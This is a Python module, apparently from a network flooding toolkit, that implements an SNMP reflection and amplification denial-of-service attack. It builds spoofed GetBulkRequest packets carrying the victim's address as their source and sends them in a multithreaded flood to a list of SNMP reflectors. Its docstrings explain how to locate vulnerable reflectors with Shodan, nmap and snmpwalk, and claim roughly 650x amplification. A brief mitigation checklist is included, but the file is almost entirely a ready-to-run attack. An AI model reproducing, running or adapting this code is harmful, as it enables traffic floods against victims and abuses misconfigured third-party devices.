"""
modules/sniper.py - SNIPER
SNMP reflection/amplification attack. Amplification factor ~650x.

How it works:
  SNMP v1/v2c GetBulkRequest spoofed as victim.
  Request  : ~60 bytes
  Response : up to 65507 bytes (GetBulkResponse with many OIDs)
  Factor   : ~650x

  Attack flow:
    Attacker -> SNMP agent (src=victim_ip, dst=reflector:161)
    SNMP agent -> victim_ip (massive GetBulkResponse)

SNMP v2c GetBulkRequest targets:
  - non-repeaters=0, max-repetitions=255 forces agent to dump entire MIB subtree
  - Community string "public" still default on many devices

Finding vulnerable reflectors:
  Shodan: port:161 "snmp" "public"
  nmap:   nmap -sU -p 161 --script snmp-info <target>
  Manual: snmpwalk -v2c -c public <ip> .1

Affected devices:
  - Cisco IOS (pre-2018 configs)
  - HP/Aruba switches
  - Printers (Brother, HP, Xerox)
  - UPS devices (APC, Eaton)
  - Industrial/SCADA equipment
  - Any device with SNMPv2c + public community

Mitigation check:
  - Is SNMP v1/v2c disabled? (v3 with auth/priv is safe)
  - Is community string "public" still default?
  - Is port 161 UDP accessible from outside?
"""

import struct
import itertools
from floodles.core.packet_builder import random_ip
from floodles.core.sender import FloodEngine

try:
    from scapy.all import IP, UDP, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# ---------------------------------------------------------------------------
# SNMP v2c GetBulkRequest packet builder
# ---------------------------------------------------------------------------

def _encode_ber_length(length: int) -> bytes:
    """BER length encoding (ASN.1)."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])


def _build_snmp_getbulk(community: str = "public",
                         max_repetitions: int = 255) -> bytes:
    """
    Build SNMP v2c GetBulkRequest PDU.
    Targets .1.3.6.1.2.1 (MIB-II) for maximum response size.

    max_repetitions=255 forces agent to return up to 255 instances
    per requested OID -> maximizes response size -> maximizes amplification.
    """
    # OID: .1.3.6.1.2.1 (MIB-II root - largest subtree)
    oid = bytes([0x06, 0x06, 0x2b, 0x06, 0x01, 0x02, 0x01])

    # VarBind: OID + NULL value
    null_val   = bytes([0x05, 0x00])
    varbind    = bytes([0x30]) + _encode_ber_length(len(oid) + len(null_val)) + oid + null_val

    # VarBindList
    varlist    = bytes([0x30]) + _encode_ber_length(len(varbind)) + varbind

    # GetBulkRequest-PDU (tag 0xa5)
    req_id     = struct.pack(">I", 0x00000001)
    req_id_tlv = bytes([0x02, 0x04]) + req_id
    non_rep    = bytes([0x02, 0x01, 0x00])              # non-repeaters = 0
    max_rep    = bytes([0x02, 0x01, max_repetitions])   # max-repetitions

    pdu_data   = req_id_tlv + non_rep + max_rep + varlist
    pdu        = bytes([0xa5]) + _encode_ber_length(len(pdu_data)) + pdu_data

    # Community string
    comm_bytes = community.encode()
    comm_tlv   = bytes([0x04]) + _encode_ber_length(len(comm_bytes)) + comm_bytes

    # SNMP version = 1 (v2c)
    version    = bytes([0x02, 0x01, 0x01])

    # Sequence wrapper
    msg_data   = version + comm_tlv + pdu
    msg        = bytes([0x30]) + _encode_ber_length(len(msg_data)) + msg_data

    return msg


# ---------------------------------------------------------------------------
# Module run()
# ---------------------------------------------------------------------------

def run(
    victim_ip: str,
    reflectors: list[str],
    community: str = "public",
    max_repetitions: int = 255,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
) -> FloodEngine:
    """
    Launch SNMP reflection attack.

    Args:
        victim_ip       : Target IP (spoofed source in all packets).
        reflectors      : List of SNMP agent IPs (port 161 UDP).
                          Find via Shodan: port:161 "public"
        community       : SNMP community string. Default "public".
        max_repetitions : GetBulk repetitions (255 = max amplification).
        threads         : Worker count.
        pps_limit       : PPS cap.
        duration        : Duration in seconds.

    Returns:
        FloodEngine (already started).

    Amplification math:
        Request  = ~60 bytes
        Response = up to 65507 bytes (UDP max)
        Factor   = ~650x
        Example  : 1 Mbps outbound -> ~650 Mbps hitting victim
    """
    if not SCAPY_AVAILABLE:
        raise ImportError("scapy required: pip install scapy")

    snmp_payload = _build_snmp_getbulk(community, max_repetitions)
    reflector_cycle = itertools.cycle(reflectors)

    def make_packet() -> bytes:
        import random
        reflector = next(reflector_cycle)
        src_ip    = victim_ip  # spoofed as victim

        pkt = IP(src=src_ip, dst=reflector) / UDP(
            sport=random.randint(1024, 65535),
            dport=161,
        ) / Raw(load=snmp_payload)
        return bytes(pkt)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=reflectors[0],
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
